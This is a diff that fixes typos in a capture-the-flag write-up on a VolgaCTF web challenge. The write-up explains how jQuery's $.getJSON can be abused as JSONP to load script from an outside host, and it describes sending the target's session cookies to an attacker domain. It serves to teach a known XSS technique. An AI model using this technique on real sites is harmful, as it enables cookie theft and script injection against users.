@@ -53,9 +53,9 @@ Another ways to get XSS on this domain will be :
 $.getJSON(`//${api}.volga-ctf.ru/user?guid=${guid}`
 ```
 
-loaded will do request on `shoebpatel.com/?volga-ctf.ru/user?guid=${guid}` which will give cookies which was being originally sent to api.volga-ctf.ru (PHPSESSIONID) Only. We have PHP cookie but we yet dont have Flag cookie :( .
+If loaded will do request on `shoebpatel.com/?volga-ctf.ru/user?guid=${guid}` which will give cookies which was being originally sent to api.volga-ctf.ru (PHPSESSIONID) Only. We have PHP cookie but we yet dont have Flag cookie :( .
 
-4. So this was a ust google search for `$.getJSON XSS` step! We needed to read and find about XSS ways in getJSON !
+4. So next step was just a simple google search for `$.getJSON XSS` step! We needed to read and find about XSS ways in getJSON !
 
 5. It was damn easy, If the URL to $.getJSON contains `?` anywhere in the following format, Examples:
 	
@@ -71,7 +71,7 @@ It will be considered as JSONP in JQuery's context and by that what it means its
 <script src="https://captainfreak.com/?a=?"></script>
 ```
 
-And this is hostes on volga-ctf.ru. Boom XSS.
+And this is hosted on volga-ctf.ru. Boom XSS!
 
 If you still need to try yourself to get this:
 
